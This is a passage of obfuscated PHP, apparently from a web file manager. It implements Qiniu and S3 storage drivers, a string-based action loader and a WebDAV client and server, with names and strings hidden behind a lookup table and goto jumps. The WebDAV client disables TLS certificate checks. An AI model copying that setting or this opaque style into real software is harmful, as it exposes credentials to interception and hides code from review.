$this->auth->privateDownloadUrl($bèÇíƒ–à, 3600 * 12); } public function fileOut($Dæš¯ÃÕÏ¸, $Dâ£•÷”›Š = false, $Dƒ¼ãÓõÊğ = false, $d‹……°¬‰è = '') { $fÕ±ã¿æëå =& $_SERVER[¨¤¼…´]; if ($this->isFileOutServer()) { return $this->fileOutServer($Dæš¯ÃÕÏ¸, $Dâ£•÷”›Š, $Dƒ¼ãÓõÊğ, $d‹……°¬‰è); } if (!$Dƒ¼ãÓõÊğ) { $Dƒ¼ãÓõÊğ = $this->pathThis($Dæš¯ÃÕÏ¸); } $fÏ„Ë­‡¯á = $Dâ£•÷”›Š ? $fÕ±ã¿æëå[1216] . rawurlencode($Dƒ¼ãÓõÊğ) : $fÕ±ã¿æëå[43]; $d‘¥Ï¾ƒí = $this->link($Dæš¯ÃÕÏ¸, $fÏ„Ë­‡¯á); $this->fileOutLink($d‘¥Ï¾ƒí); } public function fileOutServer($DÌÙ†¨ˆÍ, $eˆÒå˜Ğ» = false, $AÁ¶Ëò†ò‰ = false, $DÁõ¿»ó¨ = '') { parent::fileOut($DÌÙ†¨ˆÍ, $eˆÒå˜Ğ», $AÁ¶Ëò†ò‰, $DÁõ¿»ó¨); } public function fileOutImage($EÏĞöŒš, $aØ¹†ä„çŒ = 250) { $dÖß—­½†è = $this->link($EÏĞöŒš, $_SERVER[¨¤¼…´][1217] . $aØ¹†ä„çŒ); $this->fileOutLink($dÖß—­½†è); } public function fileOutImageServer($Dİ²÷Òªø¹, $A¥•Ã´¿ê² = 250) { parent::fileOutImage($Dİ²÷Òªø¹, $A¥•Ã´¿ê²); } public function hashMd5($F¹ˆ÷¬ÔÙ™) { $b„Ë†™Ë´ =& $_SERVER[¨¤¼…´]; $A´ôÂ´˜äÔ = $this->objectMeta($F¹ˆ÷¬ÔÙ™); return isset($A´ôÂ´˜äÔ[$b„Ë†™Ë´[210]]) ? $A´ôÂ´˜äÔ[$b„Ë†™Ë´[210]] : !1; $Fè•«…¬ = $this->link($F¹ˆ÷¬ÔÙ™, $b„Ë†™Ë´[1218]); } public function size($BäÂ÷‡ì¬è) { $f£é„ƒÙ¨ = $this->objectMeta($BäÂ÷‡ì¬è); return $f£é„ƒÙ¨ ? $f£é„ƒÙ¨[$_SERVER[¨¤¼…´][87]] : 0; } public function info($c÷·¾ÍŸ¯«) { if ($this->isFolder($c÷·¾ÍŸ¯«)) { return $this->folderInfo($c÷·¾ÍŸ¯«); } else { if ($this->isFile($c÷·¾ÍŸ¯«)) { return $this->fileInfo($c÷·¾ÍŸ¯«); } } return !1; } public function exist($fÓò”ÇÅ) { return $this->isFile($fÓò”ÇÅ) || $this->isFolder($fÓò”ÇÅ); } public function isFile($bÔÚŸÒ»ß™) { return !$this->isFolder($bÔÚŸÒ»ß™) && $this->objectMeta($bÔÚŸÒ»ß™); } public function isFolder($a‚‡„™å) { return $this->cacheMethod($_SERVER[¨¤¼…´][236], $a‚‡„™å); } protected function objectMeta($e¦ÒÌìÂ) { return $this->cacheMethod($_SERVER[¨¤¼…´][237], $e¦ÒÌìÂ); } protected function _objectMeta($e„İà„‡¦£) { $dŒªÃ÷¹Ïê =& $_SERVER[¨¤¼…´]; list($cÔ»âŞ¤Œ÷, $b¼ÅóŸœ) = $this->bucketManager->stat($this->bucket, $e„İà„‡¦£); if ($cÔ»âŞ¤Œ÷) { $cÔ»âŞ¤Œ÷[$dŒªÃ÷¹Ïê[87]] = intval($cÔ»âŞ¤Œ÷[$dŒªÃ÷¹Ïê[1205]]); } return $cÔ»âŞ¤Œ÷; } protected function _isFolder($Aò•»¯Òá) { $B»­ŒŞÁ” =& $_SERVER[¨¤¼…´]; if ($Aò•»¯Òá == $B»­ŒŞÁ”[43] || $Aò•»¯Òá == $B»­ŒŞÁ”[8]) { return !0; } list($Eî‰ñĞà­, $Câ®°¾Ûˆ) = $this->bucketManager->listFiles($this->bucket, trim($Aò•»¯Òá, $B»­ŒŞÁ”[8]) . $B»­ŒŞÁ”[8], $B»­ŒŞÁ”[43], 1, $B»­ŒŞÁ”[8]); return !empty($Eî‰ñĞà­[$B»­ŒŞÁ”[1204]]) || !empty($Eî‰ñĞà­[$B»­ŒŞÁ”[1207]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($E¡ˆŠÏ‚âç) { parent::__construct($E¡ˆŠÏ‚âç); } public function uploadFormData($có·ØöÜ¢, $A–´²¯ß±Š = 3600) { goto eÀ¼ÏŠà¢; FÇÈß«À—Ÿ: $Eˆ‚„Ê©õ… = base64_encode(json_encode($e ÊÈ÷ŞŠŸ)); $aÇœ¨œÑÌ = hash_hmac($cß‚ÜÉ“‘[1134], $e·‘ô×ÄÛª, $cß‚ÜÉ“‘[1135] . $this->secret, !0); $A×É•áÔ×‡ = hash_hmac($cß‚ÜÉ“‘[1134], $this->region, $aÇœ¨œÑÌ, !0); goto dÑä¥ìš«í; fø¢Úáæµ: $C’Š¶ê®Á = array($cß‚ÜÉ“‘[213] => $cß‚ÜÉ“‘[43], $cß‚ÜÉ“‘[1136] => $cß‚ÜÉ“‘[43], $cß‚ÜÉ“‘[1094] => $cÒªØÌàÑ¨, $cß‚ÜÉ“‘[1098] => $f§“¸æ¥ì , $cß‚ÜÉ“‘[1102] => $Eˆ‚„Ê©õ…, $cß‚ÜÉ“‘[1137] => $eŸ¡¸±¼ë, $cß‚ÜÉ“‘[1138] => $d×‚Ç¡òÕ“, $cß‚ÜÉ“‘[1139] => $AÎ£Ï…÷À‰, $cß‚ÜÉ“‘[1140] => $Då«ŞÃ¨, $cß‚ÜÉ“‘[1141] => $f·—¿öøÁ—, $cß‚ÜÉ“‘[183] => $this->getHost()); return $C’Š¶ê®Á; goto dÓ££ãÛĞ¯; E¿¾¥ä­: $dÒ ã±²†É = $cß‚ÜÉ“‘[69]; $AÎ£Ï…÷À‰ = gmdate($cß‚ÜÉ“‘[1125]); $e·‘ô×ÄÛª = gmdate($cß‚ÜÉ“‘[680]); goto eóá“ç¾£Ó; eóá“ç¾£Ó: $dƒÈÚªÈİÏ = $cß‚ÜÉ“‘[1126]; $Då«ŞÃ¨ = $A–´²¯ß±Š . $cß‚ÜÉ“‘[43]; $f§“¸æ¥ì  = $cß‚ÜÉ“‘[1090]; goto D—Äœ»ö‹Î; D—Äœ»ö‹Î: $Eµ‰‰§ÕÏ¶ = array($this->accessKey, $e·‘ô×ÄÛª, $this->region, $dÒ ã±²†É, $dƒÈÚªÈİÏ); $eŸ¡¸±¼ë = implode($cß‚ÜÉ“‘[8], $Eµ‰‰§ÕÏ¶); $e ÊÈ÷ŞŠŸ = array($cß‚ÜÉ“‘[1092] => gmdate($cß‚ÜÉ“‘[1091], strtotime($cß‚ÜÉ“‘[1127])), $cß‚ÜÉ“‘[1093] => array(array($cß‚ÜÉ“‘[1095] => $this->bucket), array($cß‚ÜÉ“‘[1094] => $cÒªØÌàÑ¨), array($cß‚ÜÉ“‘[1096], $cß‚ÜÉ“‘[1097], $cß‚ÜÉ“‘[43]), array($cß‚ÜÉ“‘[1096], $cß‚ÜÉ“‘[1128], $cß‚ÜÉ“‘[43]), array($cß‚ÜÉ“‘[1096], $cß‚ÜÉ“‘[1129], $cß‚ÜÉ“‘[43]), array($cß‚ÜÉ“‘[1098] => $f§“¸æ¥ì ), array($cß‚ÜÉ“‘[1130] => $eŸ¡¸±¼ë), array($cß‚ÜÉ“‘[1131] => $d×‚Ç¡òÕ“), array($cß‚ÜÉ“‘[1132] => $AÎ£Ï…÷À‰), array($cß‚ÜÉ“‘[1133] => $Då«ŞÃ¨))); goto FÇÈß«À—Ÿ; dÑä¥ìš«í: $e•¬Ğïñğ· = hash_hmac($cß‚ÜÉ“‘[1134], $dÒ ã±²†É, $A×É•áÔ×‡, !0); $cï¤‹Ï‡ŒŸ = hash_hmac($cß‚ÜÉ“‘[1134], $dƒÈÚªÈİÏ, $e•¬Ğïñğ·, !0); $f·—¿öøÁ— = hash_hmac($cß‚ÜÉ“‘[1134], $Eˆ‚„Ê©õ…, $cï¤‹Ï‡ŒŸ); goto fø¢Úáæµ; eÀ¼ÏŠà¢: $cß‚ÜÉ“‘ =& $_SERVER[¨¤¼…´]; $cÒªØÌàÑ¨ = $cß‚ÜÉ“‘[199]; $d×‚Ç¡òÕ“ = $cß‚ÜÉ“‘[1124]; goto E¿¾¥ä­; dÓ££ãÛĞ¯: } public function multiUploadFormData($fà°é”Ä»ˆ, $c¬¯îÌ˜õ = 3600) { $bß³ÒƒĞ¦¹ =& $_SERVER[¨¤¼…´]; $Cï‹˜Î†Î® = gmdate($bß³ÒƒĞ¦¹[1219]); $B–½ˆĞá‰î = array(); $aóõ½è©ÈÀ = $this->client->getUploadId($this->bucket, $fà°é”Ä»ˆ, $B–½ˆĞá‰î); if (!$aóõ½è©ÈÀ) { return !1; } return array($bß³ÒƒĞ¦¹[223] => $aóõ½è©ÈÀ, $bß³ÒƒĞ¦¹[183] => $this->getHost() . $bß³ÒƒĞ¦¹[8] . $this->pathEncode($fà°é”Ä»ˆ), $bß³ÒƒĞ¦¹[224] => $Cï‹˜Î†Î®, $bß³ÒƒĞ¦¹[99] => $fà°é”Ä»ˆ); } public function multiUploadAuthData($aİ¹ëÖ×·˜, $F¶ÓòìÌ” = array()) { goto a¨İ§ÉÀÆ; cµ­ÕÀÕ¢Ç: $A¡ŒĞ¥±™Å = $FÕøÌŠœ¸[228]; $FÃ…’ùä¶± = $FÕøÌŠœ¸[8] . $this->pathEncode($dĞŒ›ÃÊİò) . $d¿®£à ŸÚ; $aŞã——Ã = $this->client->__getSignatureV4($cÈ¾áë‘´„, $F¸…åêŞñ, $A¡ŒĞ¥±™Å, $FÃ…’ùä¶±); goto Bå¥š‘Ğ·ç; EÑö•‚Ø: unset($F¶ÓòìÌ”[$FÕøÌŠœ¸[99]]); if (isset($F¶ÓòìÌ”[$FÕøÌŠœ¸[225]])) { return $this->listUploadParts($dĞŒ›ÃÊİò, $F¶ÓòìÌ”); } $cÈ¾áë‘´„ = array(); goto F¤Úªè£ø©; F¤Úªè£ø©: if (isset($F¶ÓòìÌ”[$FÕøÌŠœ¸[1220]])) { $cÈ¾áë‘´„[$FÕøÌŠœ¸[1221]] = $F¶ÓòìÌ”[$FÕøÌŠœ¸[1220]]; } $EäŞª¢¤÷ = explode($FÕøÌŠœ¸[185], $this->getHost()); $F¸…åêŞñ = array($FÕøÌŠœ¸[1222] => $EäŞª¢¤÷[1], $FÕøÌŠœ¸[1223] => $FÕøÌŠœ¸[43], $FÕøÌŠœ¸[213] => $FÕøÌŠœ¸[126], $FÕøÌŠœ¸[1136] => $F¶ÓòìÌ”[$FÕøÌŠœ¸[87]]); goto cµ­ÕÀÕ¢Ç; Bå¥š‘Ğ·ç: if (strpos($d¿®£à ŸÚ, $FÕøÌŠœ¸[227]) === 0) { if (isset($cÈ¾áë‘´„[$FÕøÌŠœ¸[1221]])) { $AƒÈõŒŠ = $cÈ¾áë‘´„[$FÕøÌŠœ¸[1221]]; } else { if (isset($aŞã——Ã[$FÕøÌŠœ¸[1221]])) { $AƒÈõŒŠ = $aŞã——Ã[$FÕøÌŠœ¸[1221]]; } else { $AƒÈõŒŠ = hash($FÕøÌŠœ¸[1134], $FÕøÌŠœ¸[43]); } } return array($FÕøÌŠœ¸[233] => $aŞã——Ã[$FÕøÌŠœ¸[233]], $FÕøÌŠœ¸[1221] => $AƒÈõŒŠ, $FÕøÌŠœ¸[224] => $aŞã——Ã[$FÕøÌŠœ¸[1224]]); } return $aŞã——Ã[$FÕøÌŠœ¸[233]]; goto eóç¬ê«™; a¨İ§ÉÀÆ: $FÕøÌŠœ¸ =& $_SERVER[¨¤¼…´]; $d¿®£à ŸÚ = isset($F¶ÓòìÌ”[$FÕøÌŠœ¸[175]]) ? $F¶ÓòìÌ”[$FÕøÌŠœ¸[175]] : $FÕøÌŠœ¸[43]; $dĞŒ›ÃÊİò = $F¶ÓòìÌ”[$FÕøÌŠœ¸[99]]; goto EÑö•‚Ø; eóç¬ê«™: } public function listUploadParts($BÕÅŞÉ‚, $FªôÄ÷¨ì = array()) { goto a¥ŒÙÔ•íİ; Fö’Œ×–ª§: $DÀÂ¢Á®Ï .= $DÂ‰¨¿Âç¸[1228]; $Féóˆ¶¬¦¿ = array(); $côğŒõ÷³ª = explode($DÂ‰¨¿Âç¸[185], $this->getHost()); goto aŞ¨ê¨Ä¹‰; a¥ŒÙÔ•íİ: $DÂ‰¨¿Âç¸ =& $_SERVER[¨¤¼…´]; $féëë²ÈÀš = str_replace($DÂ‰¨¿Âç¸[234], $DÂ‰¨¿Âç¸[43], $FªôÄ÷¨ì[$DÂ‰¨¿Âç¸[175]]); $a¥Á²ñ–’Ö = $this->client->listParts($this->bucket, $BÕÅŞÉ‚, $féëë²ÈÀš); goto f‡‚¾‡; D‡ˆ„àå×: $f¾ÆùÁ»–Á = $this->client->__getSignatureV4($Féóˆ¶¬¦¿, $bÅÔŒ†®æÜ, $fÉÔ¹÷¹Ô„, $F„¿§°ßô‚, $DÀÂ¢Á®Ï); return array($DÂ‰¨¿Âç¸[233] => $f¾ÆùÁ»–Á[$DÂ‰¨¿Âç¸[233]], $DÂ‰¨¿Âç¸[224] => $f¾ÆùÁ»–Á[$DÂ‰¨¿Âç¸[1224]], $DÂ‰¨¿Âç¸[235] => $a¥Á²ñ–’Ö, $DÂ‰¨¿Âç¸[1221] => $f¾ÆùÁ»–Á[$DÂ‰¨¿Âç¸[1221]]); goto aÆ‰¬‘Áƒ; f‡‚¾‡: if (!$a¥Á²ñ–’Ö) { return !1; } $DÀÂ¢Á®Ï = $DÂ‰¨¿Âç¸[1225]; foreach ($a¥Á²ñ–’Ö as $báÎ×¯Ûöã) { $DÀÂ¢Á®Ï .= $DÂ‰¨¿Âç¸[1226] . "\x3c\x50\141\x72\x74\116\x75\x6d\x62\x65\162\x3e{$báÎ×¯Ûöã[$DÂ‰¨¿Âç¸[1178]]}\x3c\x2f\120\x61\x72\164\x4e\x75\155\x62\x65\162\x3e\12" . "\74\105\x54\x61\x67\76{$báÎ×¯Ûöã[$DÂ‰¨¿Âç¸[1179]]}\74\57\105\124\141\x67\76\xa" . $DÂ‰¨¿Âç¸[1227]; } goto Fö’Œ×–ª§; aŞ¨ê¨Ä¹‰: $bÅÔŒ†®æÜ = array($DÂ‰¨¿Âç¸[1222] => $côğŒõ÷³ª[1], $DÂ‰¨¿Âç¸[213] => $DÂ‰¨¿Âç¸[126], $DÂ‰¨¿Âç¸[1136] => strlen($DÀÂ¢Á®Ï)); $fÉÔ¹÷¹Ô„ = $DÂ‰¨¿Âç¸[226]; $F„¿§°ßô‚ = $DÂ‰¨¿Âç¸[8] . $this->pathEncode($BÕÅŞÉ‚) . $FªôÄ÷¨ì[$DÂ‰¨¿Âç¸[175]]; goto D‡ˆ„àå×; aÆ‰¬‘Áƒ: } public function link($f‚½›ê“±Â, $eÔÜ¿Û´«ƒ = array()) { return parent::link($f‚½›ê“±Â, $eÔÜ¿Û´«ƒ); } public function fileOut($D¨ÉŸŒÌœ, $d˜Â¤ØØÂë = false, $FŸÚØ¼è„ = false, $C’ùæ¦öÑ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¨¤¼…´][1229])) { return parent::fileOutServer($D¨ÉŸŒÌœ, $d˜Â¤ØØÂë, $FŸÚØ¼è„, $C’ùæ¦öÑ); } parent::fileOut($D¨ÉŸŒÌœ, $d˜Â¤ØØÂë, $FŸÚØ¼è„, $C’ùæ¦öÑ); } public function fileOutImage($fšèÓ¾÷¹†, $a½’éñ«Âˆ = 250) { if (strstr($this->endpoint, $_SERVER[¨¤¼…´][1229])) { return parent::fileOutImageServer($fšèÓ¾÷¹†, $a½’éñ«Âˆ); } parent::fileOutImage($fšèÓ¾÷¹†, $a½’éñ«Âˆ); } public function fileOutLink($aì¾Œë¶„) { $e†²–áÓ­Û =& $_SERVER[¨¤¼…´]; if (substr($aì¾Œë¶„, 0, 7) == $e†²–áÓ­Û[1105]) { $aì¾Œë¶„ = $e†²–áÓ­Û[1106] . substr($aì¾Œë¶„, 7); } header($e†²–áÓ­Û[166] . $aì¾Œë¶„); die; } public function getHost() { $C¼øŒ†ƒº† =& $_SERVER[¨¤¼…´]; $EÖˆÜ˜ = str_rtrim(parent::getHost(), $C¼øŒ†ƒº†[8] . $this->bucket); $EÖˆÜ˜ = explode($C¼øŒ†ƒº†[185], $EÖˆÜ˜); return $EÖˆÜ˜[0] . $C¼øŒ†ƒº†[185] . $this->bucket . $C¼øŒ†ƒº†[101] . $EÖˆÜ˜[1]; } } goto A÷õÑòŞ; A¶Ò™‚‚’: function Action($FµŒƒ†Ï¦ = '') { goto eù—¬Àº‘; EİÁ·×‡¬: $F×î¥ŞÈå¼ = strtolower($cæ«©îÄ´Ë[0]); if (substr($F×î¥ŞÈå¼, -6) == $fĞ’±ªº…[6]) { $FµŒƒ†Ï¦ = substr($cæ«©îÄ´Ë[0], 0, -6); $cœõœéŒİŸ = $FµŒƒ†Ï¦ . $fĞ’±ªº…[7]; $e»ÓæáÕøÖ = $fĞ’±ªº…[8]; if (isset($cæ«©îÄ´Ë[1]) && substr(strtolower($cæ«©îÄ´Ë[1]), -5) == $fĞ’±ªº…[9]) { $cœõœéŒİŸ = $FµŒƒ†Ï¦ . $cæ«©îÄ´Ë[1]; $e»ÓæáÕøÖ = $fĞ’±ªº…[10] . $cæ«©îÄ´Ë[1] . $fĞ’±ªº…[11]; } else { if (count($cæ«©îÄ´Ë) == 3) { $cœõœéŒİŸ = $FµŒƒ†Ï¦ . $cæ«©îÄ´Ë[1] . $cæ«©îÄ´Ë[2]; $e»ÓæáÕøÖ = $fĞ’±ªº…[12] . $cæ«©îÄ´Ë[1] . $fĞ’±ªº…[13] . $cæ«©îÄ´Ë[2] . $fĞ’±ªº…[11]; } } $e»ÓæáÕøÖ = PLUGIN_DIR . $FµŒƒ†Ï¦ . $fĞ’±ªº…[4] . $e»ÓæáÕøÖ; } else { if (substr($F×î¥ŞÈå¼, -5) == $fĞ’±ªº…[9]) { $FµŒƒ†Ï¦ = substr($cæ«©îÄ´Ë[0], 0, -5); return Model($FµŒƒ†Ï¦); } else { $cœõœéŒİŸ = $cæ«©îÄ´Ë[0] . $cæ«©îÄ´Ë[1]; $e»ÓæáÕøÖ = CONTROLLER_DIR . $cæ«©îÄ´Ë[0] . $fĞ’±ªº…[4] . $cæ«©îÄ´Ë[1] . $fĞ’±ªº…[14]; } } $f©ßÇœĞÔ† = strtolower($cœõœéŒİŸ); goto D‰ÆÁ·ÈÖ ; eù—¬Àº‘: $fĞ’±ªº… =& $_SERVER[ë‹ºñÌ†‡]; static $cô·­ºŞˆ˜ = array(); $bäİ‘×•¨È = $FµŒƒ†Ï¦; goto b¯àôŠªÍ; däŒŒŞÒéà: $cô·­ºŞˆ˜[$f©ßÇœĞÔ†] = new $cœõœéŒİŸ(); $cô·­ºŞˆ˜[$bäİ‘×•¨È] = $cô·­ºŞˆ˜[$f©ßÇœĞÔ†]; return $cô·­ºŞˆ˜[$f©ßÇœĞÔ†]; goto bŞ†øÅâ; b¯àôŠªÍ: if (isset($cô·­ºŞˆ˜[$bäİ‘×•¨È])) { return $cô·­ºŞˆ˜[$bäİ‘×•¨È]; } $FµŒƒ†Ï¦ = trim(str_replace($fĞ’±ªº…[4], $fĞ’±ªº…[5], $FµŒƒ†Ï¦), $fĞ’±ªº…[4]); $cæ«©îÄ´Ë = explode($fĞ’±ªº…[5], $FµŒƒ†Ï¦); goto EİÁ·×‡¬; D‰ÆÁ·ÈÖ : if (isset($cô·­ºŞˆ˜[$f©ßÇœĞÔ†])) { return $cô·­ºŞˆ˜[$f©ßÇœĞÔ†]; } if (is_file($e»ÓæáÕøÖ)) { include_once $e»ÓæáÕøÖ; } if (!class_exists($cœõœéŒİŸ)) { return actionCallError("\x5b{$FµŒƒ†Ï¦}\x20\x3d\76\x20{$cœõœéŒİŸ}\x5d\40\x63\x6c\141\x73\x73\x20\x6e\157\x74\40\x65\170\151\x73\164\163\x21"); } goto däŒŒŞÒéà; bŞ†øÅâ: } function ActionApply($bŒ½Ã±óÃß, $eÛò†êÌÔØ = array()) { goto B¯õ¬É°È; a•ƒÈ¿ßÃÙ: if (!is_object($AŒÚÅÄà²ä) || !method_exists($AŒÚÅÄà²ä, $B­ ŞĞ˜Ğñ)) { return actionCallError("{$bŒ½Ã±óÃß}\40\155\x65\164\x68\157\x64\x20\156\x6f\164\40\145\x78\151\163\164\163\41"); } $f¤ºåÙÊÕ = call_user_func_array(array($AŒÚÅÄà²ä, $B­ ŞĞ˜Ğñ), $eÛò†êÌÔØ); return $f¤ºåÙÊÕ; goto eÔµ†Ìƒ½; B¯õ¬É°È: if (is_array($bŒ½Ã±óÃß)) { return call_user_func_array($bŒ½Ã±óÃß, $eÛò†êÌÔØ); } if (function_exists($bŒ½Ã±óÃß)) { return call_user_func_array($bŒ½Ã±óÃß, $eÛò†êÌÔØ); } $B¦¹øãéÔ¥ = strrpos($bŒ½Ã±óÃß, $_SERVER[ë‹ºñÌ†‡][5]); goto B†È¥™æµò; B†È¥™æµò: $fÖÁ¢ïÖ² = substr($bŒ½Ã±óÃß, 0, $B¦¹øãéÔ¥); $B­ ŞĞ˜Ğñ = substr($bŒ½Ã±óÃß, $B¦¹øãéÔ¥ + 1); $AŒÚÅÄà²ä = Action($fÖÁ¢ïÖ²); goto a•ƒÈ¿ßÃÙ; eÔµ†Ìƒ½: } function actionCallError($EÕå¨ºŒ›‘) { return write_log($EÕå¨ºŒ›‘, $_SERVER[ë‹ºñÌ†‡][15]); } goto b„ä¯”ïÒø; cøõÓƒŒÀ: register_shutdown_function($_SERVER[ë‹ºñÌ†‡][32]); set_error_handler($_SERVER[ë‹ºñÌ†‡][46], $aÖ‘ÛÄ†’ñ); if (function_exists($_SERVER[ë‹ºñÌ†‡][47])) { set_exception_handler($_SERVER[ë‹ºñÌ†‡][48]); } goto e¢·šŸ¼¿ø; FŸô„Øí¡š: class HttpDavClient { public function __construct($aĞè¨±±Ø», $d¬¥šëàßà, $e…£í×µá) { $this->header = array(); $this->userName = $d¬¥šëàßà; $this->userPassowrd = $e…£í×µá; } protected function makePath($B¿äÃƒ–ñ) { return $B¿äÃƒ–ñ; } protected function setHeader($a‡½¦‹ø‡à, $c„á Ê™Æ = false) { if ($c„á Ê™Æ === !1) { $this->header[] = $a‡½¦‹ø‡à; } else { $this->header[] = $a‡½¦‹ø‡à . $_SERVER[¨¤¼…´][866] . $c„á Ê™Æ; } } public function move($D¥Ùë ßÃ¸, $cÑñ•—’¾, $EĞòÖÆ‚Š“ = '') { $eã¬µÀ® ° =& $_SERVER[¨¤¼…´]; $this->setHeader($eã¬µÀ® °[1756], $this->makePath($cÑñ•—’¾)); $this->setHeader($eã¬µÀ® °[1757], $eã¬µÀ® °[1758]); if ($EĞòÖÆ‚Š“) { $this->setHeader($eã¬µÀ® °[1759], $eã¬µÀ® °[911] . $EĞòÖÆ‚Š“ . $eã¬µÀ® °[914]); } return $this->send($eã¬µÀ® °[1760], $D¥Ùë ßÃ¸); } public function copy($dôˆ¦Ùù§ğ, $b¯›Â¢®òé) { $A½Ø—Õó¸Ä =& $_SERVER[¨¤¼…´]; $this->setHeader($A½Ø—Õó¸Ä[1756], $this->makePath($b¯›Â¢®òé)); $this->setHeader($A½Ø—Õó¸Ä[1757], $A½Ø—Õó¸Ä[1758]); return $this->send($A½Ø—Õó¸Ä[1761], $dôˆ¦Ùù§ğ); } public function mkcol($bŸŒÂ‰ñğÑ) { $eº¼‹®¿–Ÿ =& $_SERVER[¨¤¼…´]; $this->setHeader($eº¼‹®¿–Ÿ[1757], $eº¼‹®¿–Ÿ[1758]); return $this->send($eº¼‹®¿–Ÿ[1762], $bŸŒÂ‰ñğÑ); } public function delete($b‹éñâõ™ô, $bÇ‚ïÍ¥£Û = '') { $dÂ˜¸öé· =& $_SERVER[¨¤¼…´]; if ($bÇ‚ïÍ¥£Û) { $this->setHeader($dÂ˜¸öé·[1759], $dÂ˜¸öé·[911] . $bÇ‚ïÍ¥£Û . $dÂ˜¸öé·[914]); } return $this->send($dÂ˜¸öé·[1240], $b‹éñâõ™ô); } public function propfind($fìôêµÛáµ) { $eè´Ğ÷´œ¸ =& $_SERVER[¨¤¼…´]; $this->setHeader($eè´Ğ÷´œ¸[1763], $eè´Ğ÷´œ¸[93]); $this->setHeader($eè´Ğ÷´œ¸[1764], $eè´Ğ÷´œ¸[1765]); $F©…¹¾Ì±ß = $eè´Ğ÷´œ¸[1766]; return $this->send($eè´Ğ÷´œ¸[1767], $fìôêµÛáµ, $F©…¹¾Ì±ß); } public function options($Aƒ” ‡Î ) { return $this->send($_SERVER[¨¤¼…´][1768], $Aƒ” ‡Î ); } public function get($AÜ‘‡à•‚ê) { return $this->send($_SERVER[¨¤¼…´][230], $AÜ‘‡à•‚ê); } public function put($aÓø™àâãï, $a¦‚ò¢á–, $a‰œºã®‡ä = '') { $Bºö¶¼Ğ…Ö =& $_SERVER[¨¤¼…´]; if ($a‰œºã®‡ä) { $this->setHeader($Bºö¶¼Ğ…Ö[1759], $Bºö¶¼Ğ…Ö[911] . $a‰œºã®‡ä . $Bºö¶¼Ğ…Ö[914]); } return $this->send($Bºö¶¼Ğ…Ö[228], $aÓø™àâãï, $a¦‚ò¢á–); } protected function send($FŸöÇäƒï˜, $c™×õÓòˆË, $Bìœ´î­öê = false, $D½ÈÛŞöèÀ = false) { goto CçÛÒÒ·›³; BÚïÊòîÄ: $this->setHeader($B”†Ú¢™Œ); if ($Bìœ´î­öê) { $Bìœ´î­öê = $bĞ•ôòÁ§Æ[1770] . $Bìœ´î­öê; } if (!request_url_safe($c™×õÓòˆË)) { return !1; } goto aØ¥¦´ãˆ; aØ¥¦´ãˆ: $DÅÊÏª‰ ‰ = curl_init($c™×õÓòˆË); curl_setopt($DÅÊÏª‰ ‰, CURLOPT_CUSTOMREQUEST, $FŸöÇäƒï˜); curl_setopt($DÅÊÏª‰ ‰, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto a²¹Áæğ™ø; CçÛÒÒ·›³: $bĞ•ôòÁ§Æ =& $_SERVER[¨¤¼…´]; $B”†Ú¢™Œ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($bĞ•ôòÁ§Æ[1769], $bĞ•ôòÁ§Æ[60]); goto BÚïÊòîÄ; cÀô®³àÕ×: curl_setopt($DÅÊÏª‰ ‰, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($DÅÊÏª‰ ‰, CURLOPT_SSL_VERIFYHOST, !1); $FòŸ­‡ÂÕ = curl_exec($DÅÊÏª‰ ‰); goto b³‰…»—ˆ; b³‰…»—ˆ: $this->header = array(); return $FòŸ­‡ÂÕ; goto Bµ½´‹Ï›Ö; a²¹Áæğ™ø: curl_setopt($DÅÊÏª‰ ‰, CURLOPT_HTTPHEADER, $this->header); curl_setopt($DÅÊÏª‰ ‰, CURLOPT_RETURNTRANSFER, !0); curl_setopt($DÅÊÏª‰ ‰, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto cÀô®³àÕ×; Bµ½´‹Ï›Ö: } } class HttpDavServer { public function __construct($aÎÓÎÌâÇ³, $aÎ•ß®š) { $this->root = $aÎÓÎÌâÇ³; $this->initPath($aÎ•ß®š); $this->start(); } public function initPath($B×©ùÍ’Ûå) { $BŠÌÂ·ˆì =& $_SERVER[¨¤¼…´]; $E¡†’Éè£ó = rtrim($_SERVER[$BŠÌÂ·ˆì[1376]], $BŠÌÂ·ˆì[8]) . $BŠÌÂ·ˆì[8]; $this->urlBase = substr($E¡†’Éè£ó, 0, strpos($E¡†’Éè£ó, $B×©ùÍ’Ûå) + 1); $this->urlBase = rtrim($this->urlBase, $BŠÌÂ·ˆì[8]) . $B×©ùÍ’Ûå; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $EİñÒ¨òãŒ =& $_SERVER[¨¤¼…´]; $aÓóğ°Àó‰ = HttpAuth::get(); if ($aÓóğ°Àó‰[$EİñÒ¨òãŒ[547]] == $EİñÒ¨òãŒ[1771] && $aÓóğ°Àó‰[$EİñÒ¨òãŒ[883]] == $EİñÒ¨òãŒ[1772]) { return !0; } HttpAuth::error(); } public function start() { goto f½È…âƒ°ç; bÓÁŒ‘À³: if (!method_exists($this, $d¿ê¨˜‚)) { pr($d¿ê¨˜‚ . $EîÔš‚¡µ¡[1773]); die; } $Aõ—Âëº°‰ = array($EîÔš‚¡µ¡[1774], $EîÔš‚¡µ¡[1775]); if (!in_array($d¿ê¨˜‚, $Aõ—Âëº°‰) && !$this->pathExists($this->path)) { $A»›§ñÅ‡Ã = array($EîÔš‚¡µ¡[1023] => 404); } else { $A»›§ñÅ‡Ã = $this->{$d¿ê¨˜‚}(); } goto aè¢‚æ¬†ª; f½È…âƒ°ç: $EîÔš‚¡µ¡ =& $_SERVER[¨¤¼…´]; $this->checkUser(); $d¿ê¨˜‚ = $EîÔš‚¡µ¡[154] . HttpHeader::method(); goto bÓÁŒ‘À³; aè¢‚æ¬†ª: if (!$A»›§ñÅ‡Ã) { return; } self::response($A»›§ñÅ‡Ã); goto B…‰í·Ëí; B…‰í·Ëí: } public function pathGet($c¹§¥ğæ = false) { $dºª›°ùÃ© =& $_SERVER[¨¤¼…´]; $C—³Ó¿„² = $c¹§¥ğæ ? $_SERVER[$dºª›°ùÃ©[1776]] : $_SERVER[$dºª›°ùÃ©[1376]]; $C—³Ó¿„² = KodIO::clear(rawurldecode($C—³Ó¿„²)); if (!strstr($C—³Ó¿„², KodIO::clear($this->urlBase))) { return !1; } return substr($C—³Ó¿„², 